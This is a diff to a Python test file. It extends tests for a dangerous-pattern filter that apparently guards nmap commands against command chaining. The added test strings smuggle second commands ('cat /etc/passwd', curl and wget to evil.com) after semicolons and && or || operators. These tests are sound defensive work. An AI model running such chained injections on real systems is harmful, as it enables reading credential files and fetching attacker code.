@@ -128,4 +128,21 @@ class TestDangerousPatterns:
         assert len(DANGEROUS_PATTERNS) == len(_DANGEROUS_PATTERN_STRINGS)
 
     def test_pattern_count(self):
-        assert len(DANGEROUS_PATTERNS) == len(_DANGEROUS_PATTERN_STRINGS) == 20
+        assert len(DANGEROUS_PATTERNS) == len(_DANGEROUS_PATTERN_STRINGS) == 23
+
+    # --- Command chaining ---
+
+    def test_blocks_semicolon_command_separator(self):
+        assert _matches_any("nmap 10.0.0.1; cat /etc/passwd")
+
+    def test_blocks_ampersand_chain(self):
+        assert _matches_any("nmap 10.0.0.1 && curl http://evil.com")
+
+    def test_blocks_or_chain(self):
+        assert _matches_any("nmap 10.0.0.1 || wget http://evil.com")
+
+    def test_allows_normal_args_with_dots(self):
+        assert not _matches_any("target.example.com")
+
+    def test_allows_normal_args_with_dashes(self):
+        assert not _matches_any("nmap --top-ports 1000 target.com")
